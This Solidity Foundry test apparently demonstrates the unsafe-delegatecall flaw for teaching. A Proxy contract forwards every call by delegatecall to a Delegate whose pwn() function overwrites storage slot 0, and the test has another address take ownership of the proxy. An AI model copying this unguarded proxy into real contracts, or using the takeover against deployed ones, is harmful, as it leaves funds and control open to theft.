// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

// Unsafe Delegatecall :
// This allows a smart contract to dynamically load code from a different address at runtime.

contract UnsafeDelegateCall is Test {
  function testDelegateCall() public {
    Delegate delegate = new Delegate();
    Proxy proxy = new Proxy(address(delegate));
    console.log("before owner:", proxy.owner());


    address alice = vm.addr(1);
    vm.prank(alice);
    bytes memory data = abi.encodeWithSignature("pwn()");
    (bool success,) = address(proxy).call(data);
    assert(success);
    assertEq(proxy.owner(), alice);
    console.log("after owner:", proxy.owner());
  }
}

contract Proxy {
  address public owner;// slot 0
  address public delegate;

  constructor(address delegate_) {
    delegate = delegate_;
  }

  fallback() external {
    (bool success,) = address(delegate).delegatecall(msg.data);
    require(success, "delegatecall failed");
  }
}

contract Delegate {
  address public owner;// slot 0

  function pwn() public {
    owner = msg.sender;
  }
}